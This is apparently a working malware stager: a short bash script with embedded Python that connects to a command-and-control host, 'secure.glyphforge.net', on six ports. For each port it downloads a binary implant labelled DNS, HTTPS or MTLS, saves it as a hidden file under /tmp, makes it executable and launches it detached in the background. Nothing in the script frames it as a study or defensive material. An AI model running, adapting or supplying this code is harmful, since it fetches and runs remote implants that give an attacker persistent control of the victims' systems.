#!/bin/bash

C2="secure.glyphforge.net"

stage() {
    local port=$1
    local drop=$2

    python3 - <<EOF
import socket, struct, os, stat

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    s.connect(("$C2", $port))
    size_data = s.recv(4)
    size = struct.unpack('<I', size_data)[0]
    data = b''
    while len(data) < size:
        chunk = s.recv(size - len(data))
        if not chunk:
            break
        data += chunk
    s.close()

    with open("$drop", "wb") as f:
        f.write(data)
    os.chmod("$drop", stat.S_IRWXU)
    pid = os.fork()
    if pid == 0:
        os.setsid()
        os.execv("$drop", ["$drop"])
    print("[+] $drop started")
except Exception as e:
    print(f"[-] Failed port $port: {e}")
EOF
}

echo "[*] Staging implants..."

# Linux DNS
stage 1111 "/tmp/.dns_b"
stage 1112 "/tmp/.dns_s"

# Linux HTTPS
stage 1221 "/tmp/.http_b"
stage 1222 "/tmp/.http_s"

# Linux MTLS
stage 1331 "/tmp/.mtls_b"
stage 1332 "/tmp/.mtls_s"

echo "[*] Done"
